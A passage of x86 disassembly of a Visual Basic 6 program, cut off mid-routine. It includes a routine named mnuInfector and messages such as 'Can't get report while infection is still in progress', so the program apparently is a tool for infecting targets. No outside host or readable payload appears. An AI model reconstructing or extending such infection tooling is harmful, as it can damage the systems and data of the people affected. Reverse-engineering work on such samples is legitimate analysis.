0086C1AE: mov var_3C, 00000008h
0086C1B5: push 00000010h
0086C1B7: pop eax
0086C1B8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C1BD: lea esi, var_3C
0086C1C0: mov edi, esp
0086C1C2: movsd 
0086C1C3: movsd 
0086C1C4: movsd 
0086C1C5: movsd 
0086C1C6: push 00000001h
0086C1C8: push 0000000Dh
0086C1CA: mov eax, [ebp+08h]
0086C1CD: mov eax, [eax]
0086C1CF: push [ebp+08h]
0086C1D2: call [eax+0000032Ch]
0086C1D8: push eax
0086C1D9: lea eax, var_18
0086C1DC: push eax
0086C1DD: call 00410A84h ; Set (object)
0086C1E2: push eax
0086C1E3: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C1E8: add esp, 0000001Ch
0086C1EB: lea ecx, var_18
0086C1EE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C1F3: mov var_34, 00455E00h ; My documents
0086C1FA: mov var_3C, 00000008h
0086C201: push 00000010h
0086C203: pop eax
0086C204: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C209: lea esi, var_3C
0086C20C: mov edi, esp
0086C20E: movsd 
0086C20F: movsd 
0086C210: movsd 
0086C211: movsd 
0086C212: push 00000001h
0086C214: push 0000000Dh
0086C216: mov eax, [ebp+08h]
0086C219: mov eax, [eax]
0086C21B: push [ebp+08h]
0086C21E: call [eax+0000032Ch]
0086C224: push eax
0086C225: lea eax, var_18
0086C228: push eax
0086C229: call 00410A84h ; Set (object)
0086C22E: push eax
0086C22F: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C234: add esp, 0000001Ch
0086C237: lea ecx, var_18
0086C23A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C23F: mov var_34, 00455FA4h ; Homepath
0086C246: mov var_3C, 00000008h
0086C24D: push 00000010h
0086C24F: pop eax
0086C250: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C255: lea esi, var_3C
0086C258: mov edi, esp
0086C25A: movsd 
0086C25B: movsd 
0086C25C: movsd 
0086C25D: movsd 
0086C25E: push 00000000h
0086C260: mov eax, [ebp+08h]
0086C263: mov eax, [eax]
0086C265: push [ebp+08h]
0086C268: call [eax+0000032Ch]
0086C26E: push eax
0086C26F: lea eax, var_18
0086C272: push eax
0086C273: call 00410A84h ; Set (object)
0086C278: push eax
0086C279: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
0086C27E: lea ecx, var_18
0086C281: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086C286: mov var_04, 00000000h
0086C28D: push 0086C2B0h
0086C292: jmp 86C2AFh
0086C294: lea eax, var_1C
0086C297: push eax
0086C298: lea eax, var_18
0086C29B: push eax
0086C29C: push 00000002h
0086C29E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086C2A3: add esp, 0000000Ch
0086C2A6: lea ecx, var_2C
0086C2A9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086C2AE: ret 
End Sub

Private sub Form__86C2CF
0086C2CF: push ebp
0086C2D0: mov ebp, esp
0086C2D2: sub esp, 00000018h
0086C2D5: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086C2DA: mov eax, fs:[00h]
0086C2E0: push eax
0086C2E1: mov fs:[00000000h], esp
0086C2E8: mov eax, 000000FCh
0086C2ED: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C2F2: push ebx
0086C2F3: push esi
0086C2F4: push edi
0086C2F5: mov var_18, esp
0086C2F8: mov var_14, 0040D0A0h
0086C2FF: mov eax, [ebp+08h]
0086C302: and eax, 00000001h
0086C305: mov var_10, eax
0086C308: mov eax, [ebp+08h]
0086C30B: and al, FEh
0086C30D: mov [ebp+08h], eax
0086C310: mov var_0C, 00000000h
0086C317: mov eax, [ebp+08h]
0086C31A: mov eax, [eax]
0086C31C: push [ebp+08h]
0086C31F: call [eax+04h]
0086C322: mov var_04, 00000001h
0086C329: mov var_04, 00000002h
0086C330: push FFFFFFFFh
0086C332: call 00410A60h ; On Error ...
0086C337: mov var_04, 00000003h
0086C33E: push 00000000h
0086C340: push 80010006h
0086C345: mov eax, [ebp+08h]
0086C348: mov eax, [eax]
0086C34A: push [ebp+08h]
0086C34D: call [eax+00000324h]
0086C353: push eax
0086C354: lea eax, var_24
0086C357: push eax
0086C358: call 00410A84h ; Set (object)
0086C35D: push eax
0086C35E: lea eax, var_40
0086C361: push eax
0086C362: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C367: add esp, 00000010h
0086C36A: fldz 
0086C36C: fstp real4 ptr var_68
0086C36F: mov var_70, 00000004h
0086C376: and var_00000088, 00000000h
0086C37D: mov var_00000090, 00000002h
0086C387: lea eax, var_000000E4
0086C38D: push eax
0086C38E: mov eax, [ebp+08h]
0086C391: mov eax, [eax]
0086C393: push [ebp+08h]
0086C396: call [eax+00000080h]
0086C39C: fclex 
0086C39E: mov var_000000EC, eax
0086C3A4: cmp var_000000EC, 00000000h
0086C3AB: jnl 86C3CDh
0086C3AD: push 00000080h
0086C3B2: push 004449CCh
0086C3B7: push [ebp+08h]
0086C3BA: push var_000000EC
0086C3C0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086C3C5: mov var_00000108, eax
0086C3CB: jmp 86C3D4h
0086C3CD: and var_00000108, 00000000h
0086C3D4: fld real4 ptr var_000000E4
0086C3DA: fsub real4 ptr [00402B7Ch]
0086C3E0: fstp real4 ptr var_000000A8
0086C3E6: fstsw ax
0086C3E8: test al, 0Dh
0086C3EA: jnz 0086C8ADh
0086C3F0: mov var_000000B0, 00000004h
0086C3FA: lea eax, var_000000E8
0086C400: push eax
0086C401: mov eax, [ebp+08h]
0086C404: mov eax, [eax]
0086C406: push [ebp+08h]
0086C409: call [eax+00000088h]
0086C40F: fclex 
0086C411: mov var_000000F0, eax
0086C417: cmp var_000000F0, 00000000h
0086C41E: jnl 86C440h
0086C420: push 00000088h
0086C425: push 004449CCh
0086C42A: push [ebp+08h]
0086C42D: push var_000000F0
0086C433: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086C438: mov var_0000010C, eax
0086C43E: jmp 86C447h
0086C440: and var_0000010C, 00000000h
0086C447: lea eax, var_40
0086C44A: push eax
0086C44B: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C450: fsubr real4 ptr var_000000E8
0086C456: fsub real4 ptr [00402B70h]
0086C45C: fstp real4 ptr var_000000C8
0086C462: fstsw ax
0086C464: test al, 0Dh
0086C466: jnz 0086C8ADh
0086C46C: mov var_000000D0, 00000004h
0086C476: push 00000010h
0086C478: pop eax
0086C479: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C47E: lea esi, var_70
0086C481: mov edi, esp
0086C483: movsd 
0086C484: movsd 
0086C485: movsd 
0086C486: movsd 
0086C487: push 00000010h
0086C489: pop eax
0086C48A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C48F: lea esi, var_00000090
0086C495: mov edi, esp
0086C497: movsd 
0086C498: movsd 
0086C499: movsd 
0086C49A: movsd 
0086C49B: push 00000010h
0086C49D: pop eax
0086C49E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C4A3: lea esi, var_000000B0
0086C4A9: mov edi, esp
0086C4AB: movsd 
0086C4AC: movsd 
0086C4AD: movsd 
0086C4AE: movsd 
0086C4AF: push 00000010h
0086C4B1: pop eax
0086C4B2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C4B7: lea esi, var_000000D0
0086C4BD: mov edi, esp
0086C4BF: movsd 
0086C4C0: movsd 
0086C4C1: movsd 
0086C4C2: movsd 
0086C4C3: push 00000004h
0086C4C5: push 80011002h
0086C4CA: mov eax, [ebp+08h]
0086C4CD: mov eax, [eax]
0086C4CF: push [ebp+08h]
0086C4D2: call [eax+00000320h]
0086C4D8: push eax
0086C4D9: lea eax, var_28
0086C4DC: push eax
0086C4DD: call 00410A84h ; Set (object)
0086C4E2: push eax
0086C4E3: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C4E8: add esp, 0000004Ch
0086C4EB: lea eax, var_28
0086C4EE: push eax
0086C4EF: lea eax, var_24
0086C4F2: push eax
0086C4F3: push 00000002h
0086C4F5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086C4FA: add esp, 0000000Ch
0086C4FD: lea ecx, var_40
0086C500: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086C505: mov var_04, 00000004h
0086C50C: push 00000000h
0086C50E: push 80010006h
0086C513: mov eax, [ebp+08h]
0086C516: mov eax, [eax]
0086C518: push [ebp+08h]
0086C51B: call [eax+00000320h]
0086C521: push eax
0086C522: lea eax, var_28
0086C525: push eax
0086C526: call 00410A84h ; Set (object)
0086C52B: push eax
0086C52C: lea eax, var_50
0086C52F: push eax
0086C530: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C535: add esp, 00000010h
0086C538: fldz 
0086C53A: fstp real4 ptr var_68
0086C53D: mov var_70, 00000004h
0086C544: push 00000000h
0086C546: push 80010004h
0086C54B: mov eax, [ebp+08h]
0086C54E: mov eax, [eax]
0086C550: push [ebp+08h]
0086C553: call [eax+00000320h]
0086C559: push eax
0086C55A: lea eax, var_24
0086C55D: push eax
0086C55E: call 00410A84h ; Set (object)
0086C563: push eax
0086C564: lea eax, var_40
0086C567: push eax
0086C568: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C56D: add esp, 00000010h
0086C570: push eax
0086C571: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C576: fstp real4 ptr var_00000110
0086C57C: lea eax, var_50
0086C57F: push eax
0086C580: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C585: fadd real4 ptr var_00000110
0086C58B: fadd real4 ptr [00402BA8h]
0086C591: fstp real4 ptr var_00000088
0086C597: fstsw ax
0086C599: test al, 0Dh
0086C59B: jnz 0086C8ADh
0086C5A1: mov var_00000090, 00000004h
0086C5AB: lea eax, var_000000E4
0086C5B1: push eax
0086C5B2: mov eax, [ebp+08h]
0086C5B5: mov eax, [eax]
0086C5B7: push [ebp+08h]
0086C5BA: call [eax+00000080h]
0086C5C0: fclex 
0086C5C2: mov var_000000EC, eax
0086C5C8: cmp var_000000EC, 00000000h
0086C5CF: jnl 86C5F1h
0086C5D1: push 00000080h
0086C5D6: push 004449CCh
0086C5DB: push [ebp+08h]
0086C5DE: push var_000000EC
0086C5E4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086C5E9: mov var_00000114, eax
0086C5EF: jmp 86C5F8h
0086C5F1: and var_00000114, 00000000h
0086C5F8: fld real4 ptr var_000000E4
0086C5FE: fsub real4 ptr [00402B7Ch]
0086C604: fstp real4 ptr var_000000A8
0086C60A: fstsw ax
0086C60C: test al, 0Dh
0086C60E: jnz 0086C8ADh
0086C614: mov var_000000B0, 00000004h
0086C61E: push 00000000h
0086C620: push 80010006h
0086C625: mov eax, [ebp+08h]
0086C628: mov eax, [eax]
0086C62A: push [ebp+08h]
0086C62D: call [eax+00000324h]
0086C633: push eax
0086C634: lea eax, var_2C
0086C637: push eax
0086C638: call 00410A84h ; Set (object)
0086C63D: push eax
0086C63E: lea eax, var_60
0086C641: push eax
0086C642: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C647: add esp, 00000010h
0086C64A: push eax
0086C64B: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C650: fstp real4 ptr var_000000C8
0086C656: mov var_000000D0, 00000004h
0086C660: push 00000010h
0086C662: pop eax
0086C663: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C668: lea esi, var_70
0086C66B: mov edi, esp
0086C66D: movsd 
0086C66E: movsd 
0086C66F: movsd 
0086C670: movsd 
0086C671: push 00000010h
0086C673: pop eax
0086C674: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C679: lea esi, var_00000090
0086C67F: mov edi, esp
0086C681: movsd 
0086C682: movsd 
0086C683: movsd 
0086C684: movsd 
0086C685: push 00000010h
0086C687: pop eax
0086C688: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C68D: lea esi, var_000000B0
0086C693: mov edi, esp
0086C695: movsd 
0086C696: movsd 
0086C697: movsd 
0086C698: movsd 
0086C699: push 00000010h
0086C69B: pop eax
0086C69C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C6A1: lea esi, var_000000D0
0086C6A7: mov edi, esp
0086C6A9: movsd 
0086C6AA: movsd 
0086C6AB: movsd 
0086C6AC: movsd 
0086C6AD: push 00000004h
0086C6AF: push 80011001h
0086C6B4: mov eax, [ebp+08h]
0086C6B7: mov eax, [eax]
0086C6B9: push [ebp+08h]
0086C6BC: call [eax+00000324h]
0086C6C2: push eax
0086C6C3: lea eax, var_30
0086C6C6: push eax
0086C6C7: call 00410A84h ; Set (object)
0086C6CC: push eax
0086C6CD: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C6D2: add esp, 0000004Ch
0086C6D5: lea eax, var_30
0086C6D8: push eax
0086C6D9: lea eax, var_2C
0086C6DC: push eax
0086C6DD: lea eax, var_28
0086C6E0: push eax
0086C6E1: lea eax, var_24
0086C6E4: push eax
0086C6E5: push 00000004h
0086C6E7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086C6EC: add esp, 00000014h
0086C6EF: lea eax, var_60
0086C6F2: push eax
0086C6F3: lea eax, var_50
0086C6F6: push eax
0086C6F7: lea eax, var_40
0086C6FA: push eax
0086C6FB: push 00000003h
0086C6FD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086C702: add esp, 00000010h
0086C705: mov var_04, 00000005h
0086C70C: push 00000000h
0086C70E: push 80010005h
0086C713: mov eax, [ebp+08h]
0086C716: mov eax, [eax]
0086C718: push [ebp+08h]
0086C71B: call [eax+00000324h]
0086C721: push eax
0086C722: lea eax, var_28
0086C725: push eax
0086C726: call 00410A84h ; Set (object)
0086C72B: push eax
0086C72C: lea eax, var_50
0086C72F: push eax
0086C730: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C735: add esp, 00000010h
0086C738: push 00000000h
0086C73A: push 80010005h
0086C73F: mov eax, [ebp+08h]
0086C742: mov eax, [eax]
0086C744: push [ebp+08h]
0086C747: call [eax+00000330h]
0086C74D: push eax
0086C74E: lea eax, var_2C
0086C751: push eax
0086C752: call 00410A84h ; Set (object)
0086C757: push eax
0086C758: lea eax, var_60
0086C75B: push eax
0086C75C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C761: add esp, 00000010h
0086C764: push 00000000h
0086C766: push 80010003h
0086C76B: mov eax, [ebp+08h]
0086C76E: mov eax, [eax]
0086C770: push [ebp+08h]
0086C773: call [eax+00000324h]
0086C779: push eax
0086C77A: lea eax, var_24
0086C77D: push eax
0086C77E: call 00410A84h ; Set (object)
0086C783: push eax
0086C784: lea eax, var_40
0086C787: push eax
0086C788: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086C78D: add esp, 00000010h
0086C790: push eax
0086C791: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C796: fstp real4 ptr var_00000118
0086C79C: lea eax, var_50
0086C79F: push eax
0086C7A0: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C7A5: fadd real4 ptr var_00000118
0086C7AB: fstsw ax
0086C7AD: test al, 0Dh
0086C7AF: jnz 0086C8ADh
0086C7B5: fstp real4 ptr var_0000011C
0086C7BB: lea eax, var_60
0086C7BE: push eax
0086C7BF: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0086C7C4: fsubr real4 ptr var_0000011C
0086C7CA: fsub real4 ptr [00402BA4h]
0086C7D0: fstp real4 ptr var_68
0086C7D3: fstsw ax
0086C7D5: test al, 0Dh
0086C7D7: jnz 0086C8ADh
0086C7DD: mov var_70, 00000004h
0086C7E4: push 00000010h
0086C7E6: pop eax
0086C7E7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086C7EC: lea esi, var_70
0086C7EF: mov edi, esp
0086C7F1: movsd 
0086C7F2: movsd 
0086C7F3: movsd 
0086C7F4: movsd 
0086C7F5: push 00000001h
0086C7F7: push 80011002h
0086C7FC: mov eax, [ebp+08h]
0086C7FF: mov eax, [eax]
0086C801: push [ebp+08h]
0086C804: call [eax+00000330h]
0086C80A: push eax
0086C80B: lea eax, var_30
0086C80E: push eax
0086C80F: call 00410A84h ; Set (object)
0086C814: push eax
0086C815: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086C81A: add esp, 0000001Ch
0086C81D: lea eax, var_30
0086C820: push eax
0086C821: lea eax, var_2C
0086C824: push eax
0086C825: lea eax, var_28
0086C828: push eax
0086C829: lea eax, var_24
0086C82C: push eax
0086C82D: push 00000004h
0086C82F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086C834: add esp, 00000014h
0086C837: lea eax, var_60
0086C83A: push eax
0086C83B: lea eax, var_50
0086C83E: push eax
0086C83F: lea eax, var_40
0086C842: push eax
0086C843: push 00000003h
0086C845: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086C84A: add esp, 00000010h
0086C84D: mov var_10, 00000000h
0086C854: wait 
0086C855: push 0086C88Eh
0086C85A: jmp 86C88Dh
0086C85C: lea eax, var_30
0086C85F: push eax
0086C860: lea eax, var_2C
0086C863: push eax
0086C864: lea eax, var_28
0086C867: push eax
0086C868: lea eax, var_24
0086C86B: push eax
0086C86C: push 00000004h
0086C86E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086C873: add esp, 00000014h
0086C876: lea eax, var_60
0086C879: push eax
0086C87A: lea eax, var_50
0086C87D: push eax
0086C87E: lea eax, var_40
0086C881: push eax
0086C882: push 00000003h
0086C884: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086C889: add esp, 00000010h
0086C88C: ret 
End Sub

Private sub mnuInfector__86CA8B
0086CA8B: push ebp
0086CA8C: mov ebp, esp
0086CA8E: sub esp, 00000018h
0086CA91: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086CA96: mov eax, fs:[00h]
0086CA9C: push eax
0086CA9D: mov fs:[00000000h], esp
0086CAA4: mov eax, 0000052Ch
0086CAA9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086CAAE: push ebx
0086CAAF: push esi
0086CAB0: push edi
0086CAB1: mov var_18, esp
0086CAB4: mov var_14, 0040D0F0h
0086CABB: mov eax, [ebp+08h]
0086CABE: and eax, 00000001h
0086CAC1: mov var_10, eax
0086CAC4: mov eax, [ebp+08h]
0086CAC7: and al, FEh
0086CAC9: mov [ebp+08h], eax
0086CACC: mov var_0C, 00000000h
0086CAD3: mov eax, [ebp+08h]
0086CAD6: mov eax, [eax]
0086CAD8: push [ebp+08h]
0086CADB: call [eax+04h]
0086CADE: mov var_04, 00000001h
0086CAE5: mov var_04, 00000002h
0086CAEC: push FFFFFFFFh
0086CAEE: call 00410A60h ; On Error ...
0086CAF3: mov var_04, 00000003h
0086CAFA: mov eax, [ebp+0Ch]
0086CAFD: mov ax, [eax]
0086CB00: mov var_000004EC, ax
0086CB07: movsx eax, word ptr var_000004EC
0086CB0E: mov var_00000510, eax
0086CB14: cmp var_00000510, 00000000h
0086CB1B: jz 86CB5Bh
0086CB1D: cmp var_00000510, 00000001h
0086CB24: jz 0086D57Bh
0086CB2A: cmp var_00000510, 00000003h
0086CB31: jz 0086D8BDh
0086CB37: cmp var_00000510, 00000004h
0086CB3E: jz 0086E8D3h
0086CB44: cmp var_00000510, 00000006h
0086CB4B: jz 0086F7DCh
0086CB51: jmp 0086F85Ah
0086CB56: jmp 0086F85Ah
0086CB5B: mov var_04, 00000005h
0086CB62: push 00000000h
0086CB64: push 00000008h
0086CB66: push 00440E58h
0086CB6B: push 00000000h
0086CB6D: push 00000017h
0086CB6F: mov eax, [ebp+08h]
0086CB72: mov eax, [eax]
0086CB74: push [ebp+08h]
0086CB77: call [eax+00000320h]
0086CB7D: push eax
0086CB7E: lea eax, var_000000C4
0086CB84: push eax
0086CB85: call 00410A84h ; Set (object)
0086CB8A: push eax
0086CB8B: lea eax, var_0000013C
0086CB91: push eax
0086CB92: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CB97: add esp, 00000010h
0086CB9A: push eax
0086CB9B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086CBA0: push eax
0086CBA1: lea eax, var_000000C8
0086CBA7: push eax
0086CBA8: call 00410A84h ; Set (object)
0086CBAD: push eax
0086CBAE: lea eax, var_0000014C
0086CBB4: push eax
0086CBB5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CBBA: add esp, 00000010h
0086CBBD: push eax
0086CBBE: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086CBC3: mov var_48, eax
0086CBC6: lea eax, var_000000C8
0086CBCC: push eax
0086CBCD: lea eax, var_000000C4
0086CBD3: push eax
0086CBD4: push 00000002h
0086CBD6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086CBDB: add esp, 0000000Ch
0086CBDE: lea eax, var_0000014C
0086CBE4: push eax
0086CBE5: lea eax, var_0000013C
0086CBEB: push eax
0086CBEC: push 00000002h
0086CBEE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086CBF3: add esp, 0000000Ch
0086CBF6: mov var_04, 00000006h
0086CBFD: cmp var_48, 00000000h
0086CC01: jz 0086D576h
0086CC07: mov var_04, 00000007h
0086CC0E: mov var_00000308, 00000007h
0086CC18: mov var_00000310, 00000003h
0086CC22: mov eax, var_48
0086CC25: mov var_000002E8, eax
0086CC2B: mov var_000002F0, 00000003h
0086CC35: push 00000010h
0086CC37: pop eax
0086CC38: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086CC3D: lea esi, var_00000310
0086CC43: mov edi, esp
0086CC45: movsd 
0086CC46: movsd 
0086CC47: movsd 
0086CC48: movsd 
0086CC49: push 00000001h
0086CC4B: push 00000010h
0086CC4D: push 00440E58h
0086CC52: push 00000010h
0086CC54: pop eax
0086CC55: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086CC5A: lea esi, var_000002F0
0086CC60: mov edi, esp
0086CC62: movsd 
0086CC63: movsd 
0086CC64: movsd 
0086CC65: movsd 
0086CC66: push 00000001h
0086CC68: push 00000000h
0086CC6A: push 00440E48h
0086CC6F: push 00000000h
0086CC71: push 00000018h
0086CC73: mov eax, [ebp+08h]
0086CC76: mov eax, [eax]
0086CC78: push [ebp+08h]
0086CC7B: call [eax+00000320h]
0086CC81: push eax
0086CC82: lea eax, var_000000C4
0086CC88: push eax
0086CC89: call 00410A84h ; Set (object)
0086CC8E: push eax
0086CC8F: lea eax, var_0000013C
0086CC95: push eax
0086CC96: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CC9B: add esp, 00000010h
0086CC9E: push eax
0086CC9F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086CCA4: push eax
0086CCA5: lea eax, var_000000C8
0086CCAB: push eax
0086CCAC: call 00410A84h ; Set (object)
0086CCB1: push eax
0086CCB2: lea eax, var_0000014C
0086CCB8: push eax
0086CCB9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CCBE: add esp, 00000020h
0086CCC1: push eax
0086CCC2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086CCC7: push eax
0086CCC8: lea eax, var_000000CC
0086CCCE: push eax
0086CCCF: call 00410A84h ; Set (object)
0086CCD4: push eax
0086CCD5: lea eax, var_0000015C
0086CCDB: push eax
0086CCDC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CCE1: add esp, 00000020h
0086CCE4: push eax
0086CCE5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086CCEA: mov edx, eax
0086CCEC: lea ecx, var_5C
0086CCEF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086CCF4: push eax
0086CCF5: push 004495B8h ; Finished
0086CCFA: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0086CCFF: neg eax
0086CD01: sbb eax, eax
0086CD03: neg eax
0086CD05: neg eax
0086CD07: mov var_0000047C, ax
0086CD0E: lea ecx, var_5C
0086CD11: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0086CD16: lea eax, var_000000CC
0086CD1C: push eax
0086CD1D: lea eax, var_000000C8
0086CD23: push eax
0086CD24: lea eax, var_000000C4
0086CD2A: push eax
0086CD2B: push 00000003h
0086CD2D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086CD32: add esp, 00000010h
0086CD35: lea eax, var_0000015C
0086CD3B: push eax
0086CD3C: lea eax, var_0000014C
0086CD42: push eax
0086CD43: lea eax, var_0000013C
0086CD49: push eax
0086CD4A: push 00000003h
0086CD4C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086CD51: add esp, 00000010h
0086CD54: movsx eax, word ptr var_0000047C
0086CD5B: test eax, eax
0086CD5D: jz 0086CE19h
0086CD63: mov var_04, 00000008h
0086CD6A: mov var_00000164, 80020004h
0086CD74: mov var_0000016C, 0000000Ah
0086CD7E: mov var_00000154, 80020004h
0086CD88: mov var_0000015C, 0000000Ah
0086CD92: mov var_00000144, 80020004h
0086CD9C: mov var_0000014C, 0000000Ah
0086CDA6: mov var_000002E8, 004570E0h ; Can't get report while infection is still in progress
0086CDB0: mov var_000002F0, 00000008h
0086CDBA: lea edx, var_000002F0
0086CDC0: lea ecx, var_0000013C
0086CDC6: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0086CDCB: lea eax, var_0000016C
0086CDD1: push eax
0086CDD2: lea eax, var_0000015C
0086CDD8: push eax
0086CDD9: lea eax, var_0000014C
0086CDDF: push eax
0086CDE0: push 00000010h
0086CDE2: lea eax, var_0000013C
0086CDE8: push eax
0086CDE9: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
0086CDEE: lea eax, var_0000016C
0086CDF4: push eax
0086CDF5: lea eax, var_0000015C
0086CDFB: push eax
0086CDFC: lea eax, var_0000014C
0086CE02: push eax
0086CE03: lea eax, var_0000013C
0086CE09: push eax
0086CE0A: push 00000004h
0086CE0C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086CE11: add esp, 00000014h
0086CE14: jmp 0086F85Ah
0086CE19: mov var_04, 0000000Bh
0086CE20: cmp [008F2734h], 00000000h
0086CE27: jnz 86CE44h
0086CE29: push 008F2734h
0086CE2E: push 00413A84h
0086CE33: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086CE38: mov var_00000514, 008F2734h
0086CE42: jmp 86CE4Eh
0086CE44: mov var_00000514, 008F2734h
0086CE4E: mov eax, var_00000514
0086CE54: mov eax, [eax]
0086CE56: mov var_0000047C, eax
0086CE5C: mov eax, var_48
0086CE5F: mov var_000002E8, eax
0086CE65: mov var_000002F0, 00000003h
0086CE6F: push 00000000h
0086CE71: push 00000014h
0086CE73: push 00440E58h
0086CE78: push 00000010h
0086CE7A: pop eax
0086CE7B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086CE80: lea esi, var_000002F0
0086CE86: mov edi, esp
0086CE88: movsd 
0086CE89: movsd 
0086CE8A: movsd 
0086CE8B: movsd 
0086CE8C: push 00000001h
0086CE8E: push 00000000h
0086CE90: push 00440E48h
0086CE95: push 00000000h
0086CE97: push 00000018h
0086CE99: mov eax, [ebp+08h]
0086CE9C: mov eax, [eax]
0086CE9E: push [ebp+08h]
0086CEA1: call [eax+00000320h]
0086CEA7: push eax
0086CEA8: lea eax, var_000000C4
0086CEAE: push eax
0086CEAF: call 00410A84h ; Set (object)
0086CEB4: push eax
0086CEB5: lea eax, var_0000013C
0086CEBB: push eax
0086CEBC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CEC1: add esp, 00000010h
0086CEC4: push eax
0086CEC5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086CECA: push eax
0086CECB: lea eax, var_000000C8
0086CED1: push eax
0086CED2: call 00410A84h ; Set (object)
0086CED7: push eax
0086CED8: lea eax, var_0000014C
0086CEDE: push eax
0086CEDF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CEE4: add esp, 00000020h
0086CEE7: push eax
0086CEE8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086CEED: push eax
0086CEEE: lea eax, var_000000CC
0086CEF4: push eax
0086CEF5: call 00410A84h ; Set (object)
0086CEFA: push eax
0086CEFB: lea eax, var_0000015C
0086CF01: push eax
0086CF02: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086CF07: add esp, 00000010h
0086CF0A: push eax
0086CF0B: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086CF10: mov edx, eax
0086CF12: lea ecx, var_5C
0086CF15: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086CF1A: push eax
0086CF1B: call 004109DCh ; Val(arg_1)
0086CF20: push ecx
0086CF21: push ecx
0086CF22: fstp real8 ptr [esp]
0086CF25: call 00410790h ; msvbvm60.dll.__vbaStrR8
0086CF2A: mov edx, eax
0086CF2C: lea ecx, var_60
0086CF2F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086CF34: push eax
0086CF35: mov eax, var_0000047C
0086CF3B: mov eax, [eax]
0086CF3D: push var_0000047C
0086CF43: call [eax+000001C4h]
0086CF49: fclex 
0086CF4B: mov var_00000480, eax
0086CF51: cmp var_00000480, 00000000h
0086CF58: jnl 86CF7Dh
0086CF5A: push 000001C4h
0086CF5F: push 00444A54h
0086CF64: push var_0000047C
